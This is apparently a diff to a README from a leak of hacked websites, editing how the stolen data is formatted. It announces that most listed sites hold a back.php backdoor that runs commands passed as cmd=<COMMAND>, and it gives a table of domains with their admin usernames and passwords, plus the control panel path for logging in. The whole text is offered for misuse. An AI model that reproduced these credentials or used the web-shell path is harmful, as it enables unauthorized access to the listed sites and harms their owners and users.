@@ -8,8 +8,10 @@ so now everything will be dumped all over the internet.
 
 Most of these websites have a backdoor in them located at http://<SITE>.<EXT>/back.php to use this backdoor just do back.php?cmd=<COMMAND>
 
-Admin information for the listed sites (when hacked) in site, user, password format:
+Admin information for the listed sites (when hacked browse to <URL>/controlpanel):
 
+```
+URL|USERNAME|PASSWORD
 thirdconceptjournal.co.in|thirdcon|HQ=UIWO+9MEN
 allindiashoppingmalls.com|wwwallin|ravi-alisha1318
 bikearent.in|bikearent|l}qH@3N~xrdn
@@ -19,6 +21,7 @@ innovativegroupofcolleges.com|innovativegroupo|tG4,-TtaIuZx
 modernpetcentre.in|modernpetcentre|O$P[whPF_frr
 thirdconceptjournal.co.in|thirdcon|HQ=UIWO+9MEN
 ueb.ac.in|uebac|A=]S)+ZVy)xn
+```
 
 # URL
 
